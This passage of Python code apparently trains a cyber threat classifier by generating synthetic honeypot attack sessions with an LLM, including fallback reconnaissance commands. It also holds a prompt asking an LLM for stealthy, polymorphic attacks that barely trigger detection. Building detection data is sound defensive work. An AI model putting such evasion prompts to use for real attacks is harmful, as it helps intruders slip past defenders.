        print(f"\n--- Generating {target} {class_name} sessions ---")

        class_sessions = []
        for i in range(target):
            print(f"  [{i+1}/{target}] ", end="", flush=True)
            session = await generator.generate_session(class_id)
            if session:
                class_sessions.append(session)
                generated += 1
            else:
                print(f"  ✗ Failed, using template fallback")
                from training.neural.synthetic import SyntheticGenerator
                gen = SyntheticGenerator(random_seed=random.randint(1, 1000000))
                if class_id == 1:
                    class_sessions.append(gen.generate_recon_session())
                elif class_id == 3:
                    class_sessions.append(gen.generate_exploit_session())
                else:
                    config = CLASS_CONFIG[class_id]
                    class_sessions.append({
                        "session_id": f'fallback_{CLASS_CONFIG[class_id]["name"].lower()}_{random.randint(100000, 999999)}',
                        "src_ip": f'{random.randint(1, 223)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}',
                        "num_commands": 5,
                        "duration_sec": random.uniform(30, 600),
                        "commands": "; ".join(["ls -la", "whoami", "id", "netstat -tulpn"]),
                        "label_id": class_id,
                        "label_name": config["name"],
                        **{col: 0.0 for col in get_mitre_feature_columns()},
                        **{col: 0.0 for col in ['triage_file_size', 'triage_entropy', 'triage_priority',
                            'triage_is_go', 'triage_is_packed', 'triage_is_stripped',
                            'triage_is_dll', 'triage_is_static', 'triage_score_mining',
                            'triage_score_botnet', 'triage_score_recon', 'triage_score_destructive']},
                        "num_downloads": 0,
                        "download_shas": "",
                        "change_features": [0.0]*20,
                        "binary_type": "none",
                        "system_changes_summary": "",
                    })

        all_sessions.extend(class_sessions)
        print(f"  Completed: {len(class_sessions)}/{target} {class_name} sessions")

    df = pd.DataFrame(all_sessions)
    print(f"\n{'='*60}")
    print(f"Generation complete: {generated}/{sum(n_per_class.values())} via LLM")
    print(f"Label distribution:")
    print(df['label_id'].value_counts().sort_index())
    print(f"{'='*60}\n")

    if output_path:
        import os
        file_exists = os.path.isfile(output_path)
        
        # To prevent schema mismatch corruption when appending, we read the existing CSV, 
        # concat properly using pandas (which aligns columns), and overwrite.
        if file_exists:
            existing_df = pd.read_csv(output_path)
            combined_df = pd.concat([existing_df, df], ignore_index=True)
            combined_df.to_csv(output_path, index=False)
            print(f"Appended {len(df)} sessions. Total in {output_path}: {len(combined_df)}")
        else:
            df.to_csv(output_path, index=False)
            print(f"Created new file {output_path} with {len(df)} sessions.")

    return df


# =============================================================================
# LLM-ASSISTED TRAINING HELPERS (For Active Learning During Training)
# =============================================================================

async def llm_review_misclassifications(
    config: Dict,
    model,
    val_loader,
    class_names: List[str],
    max_reviews: int = 50
) -> List[Dict]:
    """
    Use LLM to review misclassified samples from validation set.
    Returns list of reviews with LLM explanations.
    """
    router = LLMRouter(config)
    reviews = []

    model.eval()
    with torch.no_grad():
        for batch in val_loader:
            commands = batch['commands']
            labels = batch['labels']
            mitre = batch['mitre']
            changes = batch['changes']
            triage = batch['triage']
            modality_mask = batch['modality_mask']
            lengths = batch['lengths']

            logits = model(commands, mitre, changes, triage, lengths, modality_mask)
            probs = torch.softmax(logits, dim=1)
            preds = torch.argmax(probs, dim=1)
            confidences = probs.max(dim=1)[0]

            # Find misclassified or low-confidence samples
            for i in range(len(labels)):
                if preds[i] != labels[i] or confidences[i] < 0.7:
                    if len(reviews) >= max_reviews:
                        return reviews

                    cmd_text = commands[i]  # Already tokenized, need decode
                    true_label = class_names[labels[i].item()]
                    pred_label = class_names[preds[i].item()]
                    confidence = confidences[i].item()

                    # Ask LLM to explain
                    prompt = f"""
                    A cyber threat classifier predicted '{pred_label}' (confidence: {confidence:.2f})
                    but the true label is '{true_label}'.

                    Commands: {cmd_text}

                    Explain why this might be misclassified. What MITRE techniques are present?
                    What features would help distinguish {true_label} from {pred_label}?
                    """

                    response = await router.generate(
                        intent_label="Exploit",
                        system_instruction="You are a cyber threat analyst. Explain misclassifications.",
                        prompt=prompt
                    )

                    reviews.append({
                        "commands": cmd_text,
                        "true_label": true_label,
                        "predicted_label": pred_label,
                        "confidence": confidence,
                        "llm_explanation": response
                    })

    return reviews


async def llm_generate_edge_cases(
    config: Dict,
    weak_class: int,
    n_samples: int = 20
) -> pd.DataFrame:
    """
    Generate adversarial/edge-case samples for a weak class using LLM.
    """
    router = LLMRouter(config)
    class_name = CLASS_CONFIG[weak_class]["name"]

    prompt = f"""
    Generate {n_samples} EDGE CASE attack sessions for class {class_name} (id={weak_class}).

    These should be:
    - Ambiguous cases that could be confused with other classes
    - Novel attack patterns not in standard training data
    - Minimal/stealthy attacks that barely trigger detection
    - Polymorphic variants of known attacks

    For each, output JSON with: commands, binary_type, system_changes_summary.
    Output as JSON array.
    """

    response = await LLMRouter(config).generate(
        intent_label=CLASS_CONFIG[weak_class]["name"],
        system_instruction=SIMPLIFIED_SYSTEM_PROMPT,
        prompt=prompt
    )

    try:
        sessions = json.loads(response)
        if isinstance(sessions, dict):
            sessions = [sessions]

        df = pd.DataFrame(sessions)
        # Build full features for each
        return df
    except Exception as e:
        print(f"Edge case generation failed: {e}")
        return pd.DataFrame()


if __name__ == "__main__":
    # Test run
    import yaml

    with open("config/settings.yaml", "r") as f:
        config = yaml.safe_load(f)

    import argparse
    parser = argparse.ArgumentParser(description="Generate LLM Synthetic Data")
    parser.add_argument("--full", action="store_true", help="Generate full dataset using CLASS_CONFIG target_count for ALL classes")
    parser.add_argument("--class_id", type=int, choices=[0,1,2,3,4,5], help="Generate full target_count for a specific class only")
    parser.add_argument('--output', type=str, default='data/exports/synthetic_batches.csv', help="Where to save the CSV")
    args = parser.parse_args()

    if args.class_id is not None:
        count = CLASS_CONFIG[args.class_id]["target_count"]
        print(f"Generating Class {args.class_id} ({CLASS_CONFIG[args.class_id]['name']}): {count} sessions...")
        test_counts = {args.class_id: count}
    elif args.full:
        total = sum(cfg["target_count"] for cfg in CLASS_CONFIG.values())
        print(f"Starting FULL generation ({total} sessions across all classes)...")
        test_counts = {cid: cfg["target_count"] for cid, cfg in CLASS_CONFIG.items()}
    else:
        print("Starting QUICK TEST (5 sessions per class). Use --class_id N or --full for real generation.")
        test_counts = {0: 3, 1: 3, 2: 3, 3: 4, 4: 3, 5: 3}

    print(f"Output will be saved to: {args.output}")

    df = asyncio.run(generate_synthetic_sessions_llm(
        config=config,
        n_per_class=test_counts,
        random_seed=42,
        max_retries=2,
        validation_enabled=True,
        output_path=args.output
    ))

    if not df.empty:
        print("\nGenerated sessions preview:")
        print(df[["session_id", "label_name", "num_commands", "commands"]].head())